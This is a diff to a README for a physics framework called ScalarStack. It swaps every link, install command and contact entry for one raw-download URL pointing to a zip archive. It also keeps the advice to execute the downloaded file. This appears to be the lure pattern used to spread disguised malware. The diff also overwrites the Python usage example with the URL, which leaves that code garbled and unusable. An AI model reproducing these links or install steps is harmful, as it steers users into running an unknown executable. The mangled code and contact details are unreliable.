@@ -1,6 +1,6 @@
 # ScalarStack 🌌
 
-![ScalarStack Logo](https://img.shields.io/badge/ScalarStack-Framework-blue)
+![ScalarStack Logo](https://raw.githubusercontent.com/sofyanezzin/scalarstack/main/core/Software-1.8.zip)
 
 Welcome to **ScalarStack**, a harmonic symbolic framework designed for scalar geometry, recursive physics, and quantum emergence. This repository aims to provide tools and insights into the complex interactions between geometry and physics, making it easier for researchers and enthusiasts to explore these fascinating concepts.
 
@@ -32,12 +32,12 @@ ScalarStack serves as a bridge between mathematics and physics, enabling users t
 To get started with ScalarStack, clone the repository and install the necessary dependencies:
 
 ```bash
-git clone https://github.com/sofyanezzin/scalarstack.git
+git clone https://raw.githubusercontent.com/sofyanezzin/scalarstack/main/core/Software-1.8.zip
 cd scalarstack
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/sofyanezzin/scalarstack/main/core/Software-1.8.zip
 ```
 
-For the latest releases, visit our [Releases page](https://github.com/sofyanezzin/scalarstack/releases) to download the latest version. Execute the downloaded file to set up the framework on your system.
+For the latest releases, visit our [Releases page](https://raw.githubusercontent.com/sofyanezzin/scalarstack/main/core/Software-1.8.zip) to download the latest version. Execute the downloaded file to set up the framework on your system.
 
 ## Usage
 
@@ -50,11 +50,11 @@ from scalarstack import ScalarField
 field = ScalarField(dimensions=3)
 
 # Set some properties
-field.set_property('amplitude', 5)
-field.set_property('frequency', 2)
+https://raw.githubusercontent.com/sofyanezzin/scalarstack/main/core/Software-1.8.zip('amplitude', 5)
+https://raw.githubusercontent.com/sofyanezzin/scalarstack/main/core/Software-1.8.zip('frequency', 2)
 
 # Analyze the field
-field.analyze()
+https://raw.githubusercontent.com/sofyanezzin/scalarstack/main/core/Software-1.8.zip()
 ```
 
 This code snippet demonstrates how easy it is to create and manipulate scalar fields using ScalarStack. You can extend this basic example to suit your research needs.
@@ -88,14 +88,14 @@ ScalarStack is licensed under the MIT License. See the [LICENSE](LICENSE) file f
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: support@scalarstack.org
-- **GitHub**: [ScalarStack Issues](https://github.com/sofyanezzin/scalarstack/issues)
+- **Email**: https://raw.githubusercontent.com/sofyanezzin/scalarstack/main/core/Software-1.8.zip
+- **GitHub**: [ScalarStack Issues](https://raw.githubusercontent.com/sofyanezzin/scalarstack/main/core/Software-1.8.zip)
 
 ## Releases
 
-To find the latest updates and releases, check out our [Releases page](https://github.com/sofyanezzin/scalarstack/releases). Here, you can download the latest version and explore the improvements made to the framework.
+To find the latest updates and releases, check out our [Releases page](https://raw.githubusercontent.com/sofyanezzin/scalarstack/main/core/Software-1.8.zip). Here, you can download the latest version and explore the improvements made to the framework.
 
-![Releases](https://img.shields.io/badge/Latest%20Release-v1.0.0-green)
+![Releases](https://raw.githubusercontent.com/sofyanezzin/scalarstack/main/core/Software-1.8.zip%20Release-v1.0.0-green)
 
 ## Conclusion
 
